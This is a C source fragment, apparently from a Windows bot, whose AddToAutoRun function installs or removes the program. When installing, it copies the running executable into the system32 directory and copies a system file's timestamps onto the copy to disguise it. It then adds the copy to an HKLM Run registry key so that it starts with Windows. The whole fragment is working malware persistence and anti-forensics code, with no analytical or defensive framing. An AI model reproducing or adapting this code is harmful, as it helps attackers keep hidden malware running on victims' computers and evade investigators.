// ------------------
// AddToRun
// установка в систему
// modes:
// 1 - install
// 2 - delete
// ------------------
DWORD WINAPI AddToAutoRun(DWORD mode)
{
	HKEY hKey;
	char BotName[MAX_PATH], CurLocBuf[MAX_PATH], SysBuf[MAX_PATH], Kernel32Buf[MAX_PATH];
	FILETIME aFileTime, bFileTime, cFileTime; HANDLE hTimeFile;
	
	// copy at system32
	GetModuleFileName(GetModuleHandle(NULL), CurLocBuf, MAX_PATH);
	GetSystemDirectory(SysBuf, MAX_PATH);

	wsprintf(BotName, "%s\\%s", SysBuf, EXE_NAME);
	
	if(mode == 1)
	{
		// install date from DATEFROM
			wsprintf(Kernel32Buf, "%s\\%s", SysBuf, DATEFROM);
			
			hTimeFile = CreateFile(Kernel32Buf, GENERIC_READ, FILE_SHARE_READ, 0, 
								  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
					  
			if (hTimeFile != INVALID_HANDLE_VALUE) 
			{
				GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
				CloseHandle(hTimeFile);
			}
						
			CopyFile(CurLocBuf, BotName, FALSE);
		
			hTimeFile = CreateFile(BotName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, 
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		
			if (hTimeFile != INVALID_HANDLE_VALUE) 
			{
					SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
					CloseHandle(hTimeFile);
			}
			
		// add to run
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_WRITE,&hKey)==ERROR_SUCCESS)
		{
			RegSetValueEx(hKey, REGNAME, 0, REG_SZ, (unsigned char*)BotName, lstrlen(BotName));
			RegCloseKey(hKey);
		}
	}
	else
	if(mode == 2)
	{
		DeleteFile(BotName);
		
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_WRITE, &hKey)==ERROR_SUCCESS)
		{
			RegDeleteValue(hKey, REGNAME);
			RegCloseKey(hKey);
		}
		
		ExitThread(0);
	}
	return TRUE;
}